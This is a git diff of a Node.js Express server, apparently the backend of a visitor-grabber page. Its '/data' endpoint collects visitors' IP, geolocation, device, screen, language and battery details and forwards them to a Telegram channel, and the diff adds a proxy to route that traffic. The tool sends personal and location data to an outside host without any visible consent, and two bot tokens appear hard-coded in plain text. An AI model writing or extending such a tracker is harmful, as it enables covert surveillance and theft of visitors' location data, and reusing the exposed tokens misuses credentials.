@@ -1,14 +1,18 @@
 const express = require('express');
 const axios = require('axios');
+const HttpsProxyAgent = require('https-proxy-agent');
 const app = express();
 
-const TOKEN = '7172780195:AAEh62mIlTEn5raF9oW94HKOzp23Rtk1R2M'; // Убедись, что тут твой токен
-const CHANNEL = '@vlomvlomdata'; // Убедись, что тут твой канал
+const TOKEN = '7962767337:AAG1w_PlojpJ8GCkTKIPvinNiGomB6gqQEo';
+const CHANNEL = '@vlomvlomdata';
+
+// Настройка прокси (найди рабочий прокси, например, через free-proxy-list.net)
+const proxyAgent = new HttpsProxyAgent('http://your-proxy:port'); // Замени на свой прокси
+const axiosInstance = axios.create({ httpsAgent: proxyAgent });
 
 app.use(express.static('public'));
 app.use(express.json());
 
-// Функция для получения страны по IP
 async function getCountryByIp(ip) {
     try {
         const response = await axios.get(`http://ip-api.com/json/${ip}`);
@@ -25,7 +29,6 @@ async function getCountryByIp(ip) {
     }
 }
 
-// Функция для преобразования кода страны в эмодзи флага
 function getFlagEmoji(countryCode) {
     if (!countryCode) return '';
     const codePoints = countryCode
@@ -35,7 +38,6 @@ function getFlagEmoji(countryCode) {
     return String.fromCodePoint(...codePoints);
 }
 
-// Функция для определения устройства из User-Agent
 function parseDevice(userAgent) {
     let deviceType = 'Desktop';
     let deviceName = 'Unknown';
@@ -62,17 +64,16 @@ function parseDevice(userAgent) {
 }
 
 app.post('/data', async (req, res) => {
+    console.log('Запрос на /data получен');
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const { userAgent, time, geolocation, screenResolution, language, battery } = req.body;
 
-    // Получаем страну по IP
+    console.log('Получены данные:', { ip, userAgent, time, geolocation, screenResolution, language, battery });
+
     const { country, countryCode } = await getCountryByIp(ip);
     const flag = getFlagEmoji(countryCode);
-
-    // Определяем устройство
     const device = parseDevice(userAgent);
 
-    // Форматируем сообщение
     const message = `🔔 Новый посетитель!\n` +
         `🌍 Страна: ${country} ${flag}\n` +
         `🕒 Время: ${time}\n` +
@@ -83,14 +84,18 @@ app.post('/data', async (req, res) => {
         `🔋 Батарея: ${battery || 'Не предоставлена'}`;
 
     try {
-        await axios.get(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        const response = await axiosInstance.get(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
             params: {
                 chat_id: CHANNEL,
                 text: message
             }
         });
+        console.log('Сообщение отправлено в Telegram:', response.data);
     } catch (error) {
-        console.log('Пиздец, ошибка', error.message);
+        console.log('Пиздец, ошибка:', error.message);
+        if (error.response) {
+            console.log('Детали ошибки:', error.response.data);
+        }
     }
 
     res.send('ok');
